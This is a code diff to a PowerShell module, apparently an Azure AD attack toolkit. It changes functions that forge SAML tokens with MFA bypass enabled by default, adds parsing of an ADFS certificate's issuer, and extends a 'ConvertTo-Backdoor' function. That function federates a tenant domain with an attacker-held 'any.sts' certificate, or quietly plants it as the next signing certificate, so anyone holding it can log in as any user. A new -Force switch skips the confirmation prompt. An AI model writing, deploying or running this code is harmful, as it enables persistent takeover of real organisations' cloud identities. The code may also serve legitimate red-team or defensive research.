@@ -77,8 +77,14 @@ function New-SAMLToken
         [Parameter(ParameterSetName='Certificate',Mandatory=$False)]
         [String]$ImmutableID,
 
-        [Parameter(Mandatory=$True)]
+        [Parameter(ParameterSetName='DeviceFileAndPassword',Mandatory=$False)]
+        [Parameter(ParameterSetName='DeviceCertificate',Mandatory=$False)]
+        [Parameter(ParameterSetName='DeviceUseAnySTS',Mandatory=$False)]
+        [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
+        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
+        [Parameter(ParameterSetName='Certificate',Mandatory=$False)]
         [String]$Issuer,
+
         [Parameter(Mandatory=$False)]
         [bool]$ByPassMFA=$true,
 
@@ -139,6 +145,7 @@ function New-SAMLToken
         elseif($Certificate -eq $null) # Load the certificate
         {
             $Certificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword
+            $Issuer = Get-ADFSIssuer -Certificate $Certificate -Issuer $Issuer
         }
 
         # Check the dates
@@ -271,7 +278,9 @@ function New-SAML2Token
         [String]$UPN="joulupukki@korvatunturi.fi", # Not used in AAD identity federation, defaults to Santa Claus ;)
         [Parameter(Mandatory=$True)]
         [String]$ImmutableID,
-        [Parameter(Mandatory=$True)]
+        
+        [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
+        [Parameter(Mandatory=$False)]
         [String]$Issuer,
 
         [Parameter(Mandatory=$False)]
@@ -306,6 +315,7 @@ function New-SAML2Token
         elseif($Certificate -eq $null) # Load the ceftificate
         {
             $Certificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword
+            $Issuer = Get-ADFSIssuer -Certificate $Certificate -Issuer $Issuer
         }
 
         if([String]::IsNullOrEmpty($InResponseTo))
@@ -543,8 +553,6 @@ function Open-Office365Portal
         [String]$UPN="joulupukki@korvatunturi.fi", # Not used in AAD identity federation, defaults to Santa Claus ;)
         [Parameter(Mandatory=$True)]
         [String]$ImmutableID,
-        [Parameter(Mandatory=$True)]
-        [String]$Issuer,
         [Parameter(Mandatory=$False)]
         [bool]$ByPassMFA=$true,
         [ValidateSet('WSFED','SAMLP')]
@@ -557,6 +565,11 @@ function Open-Office365Portal
 
         [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
         [switch]$UseBuiltInCertificate,
+        
+        [Parameter(ParameterSetName='UseAnySTS',Mandatory=$True)]
+        [Parameter(Mandatory=$False)]
+        [String]$Issuer,
+
         [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
         [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
         [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
@@ -596,6 +609,8 @@ function Open-Office365Portal
                 $_
                 return
             }
+
+            $Issuer = Get-ADFSIssuer -Certificate $Certificate -Issuer $Issuer
         }
 
         $form=""
@@ -723,7 +738,9 @@ function ConvertTo-Backdoor
     Opens a backdoor to Azure AD tenant by altering the given domains authentication settings.
     Allows logging in as any user of the tenant.
 
-    The certificate will be configured to be any.sts and issuer http://any.sts/<8 byte hex-value>
+    If the domain is managed, the certificate will be configured to be any.sts and issuer http://any.sts/<8 byte hex-value>
+
+    If the domain is already federated, the any.sts certificate will be added as NextSigningCertificate
 
     .Parameter AccessToken
     Access Token
@@ -749,7 +766,7 @@ function ConvertTo-Backdoor
         [Parameter(Mandatory=$True)]
         [String]$DomainName,
         [Parameter(Mandatory=$False)]
-        [switch]$Create
+        [switch]$Force
     )
     Process
     {
@@ -760,16 +777,27 @@ function ConvertTo-Backdoor
         $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -ClientID "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net"
 
         # Set some variables
+        $domain = Get-Domain -AccessToken $AccessToken -DomainName $DomainName
+
         $tenant_id = Get-TenantId -AccessToken $AccessToken
 
         $LogOnOffUri ="https://any.sts/$UniqueID"
         $IssuerUri = "http://any.sts/$UniqueID"
-
-        $input = read-host "Are you sure to create backdoor with $DomainName`? Type YES to continue or CTRL+C to abort"
+        
+        if($force)
+        {
+            $input = "yes"
+        }
+        else
+        {
+            $input = read-host "Are you sure to create backdoor with $DomainName`? Type YES to continue or CTRL+C to abort"
+        }
         switch ($input) `
         {
             "yes" {
                 # Tries to create a new unverified domain
+                # Deprecated, doesn't work anymore
+                <#
                 if($Create)
                 {
                     New-Domain -AccessToken $AccessToken -Name $DomainName 
@@ -785,7 +813,26 @@ function ConvertTo-Backdoor
                     }
                     Write-Progress -Activity "Waiting" -Status "Waiting $seconds seconds for the domain to be ready..." -SecondsRemaining 0 -Completed
                 }
-                Set-DomainAuthentication -Authentication Federated -AccessToken $AccessToken -DomainName $DomainName -LogOffUri $LogOnOffUri -PassiveLogOnUri $LogOnOffUri -IssuerUri $IssuerUri -SigningCertificate $any_sts -SupportsMfa $true
+                #>
+                if($domain.Authentication -eq "Federated")
+                {
+                    Write-Verbose "Domain $DomainName is Federated, modifying NextTokenSigningCertificate"
+                    $federationSettings = Get-DomainFederationSettings -AccessToken $AccessToken -DomainName $DomainName
+                    if(($federationSettings.SigningCertificate -eq $any_sts) -or ($federationSettings.NextSigningCertificate -eq $any_sts))
+                    {
+                        Throw "Domain $DomainName is already a back door"
+                    }
+
+                    $PassiveLogOnUri = $federationSettings.PassiveLogOnUri
+                    $LogOffUri       = $federationSettings.LogOffUri
+                    $IssuerUri       = $federationSettings.IssuerUri
+                    Set-DomainFederationSettings -AccessToken $AccessToken -DomainName $DomainName -IssuerUri $IssuerUri -LogOffUri $LogOffUri -PassiveLogOnUri $PassiveLogOnUri -SigningCertificate $federationSettings.SigningCertificate -NextSigningCertificate $any_sts
+                }
+                else
+                {
+                    Write-Verbose "Domain $DomainName is Mederated, converting to Federated"
+                    Set-DomainAuthentication -Authentication Federated -AccessToken $AccessToken -DomainName $DomainName -LogOffUri $LogOnOffUri -PassiveLogOnUri $LogOnOffUri -IssuerUri $IssuerUri -SigningCertificate $any_sts -SupportsMfa $true
+                }
                 
                 Return New-Object PSObject -Property @{"Domain"=$DomainName; "IssuerUri" = $IssuerUri}
                 
@@ -801,6 +848,7 @@ function ConvertTo-Backdoor
 
 # Creates a backdoor to Azure AD
 # 03.02.2019
+# Deprecated, doesn't work anymore
 function New-Backdoor
 {
 <#
@@ -839,5 +887,39 @@ function New-Backdoor
 
         ConvertTo-Backdoor -AccessToken $AccessToken -DomainName $DomainName -Create
 
+    }
+}
+
+# Parses the issuer from the given certificate
+# Nov 11th 2023
+function Get-ADFSIssuer
+{
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]$Issuer,
+        [Parameter(Mandatory=$True)]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
+    )
+    Process
+    {
+        # Issuer not provided, try to parse from the certificate subject
+        if([string]::IsNullOrEmpty($issuer) -and $Certificate.Subject.StartsWith("CN=ADFS Signing"))
+        {
+            Write-Verbose "Issuer not provided, trying to parse from certificate"
+            try
+            {
+                $server = $Certificate.Subject.Split("-")[1].TrimStart(" ")
+                $Issuer = "http://$server/adfs/services/trust"
+            }
+            catch{}
+        }
+
+        if([string]::IsNullOrEmpty($issuer))
+        {
+            throw "Issuer must be provided!"
+        }
+
+        return $Issuer
     }
 }
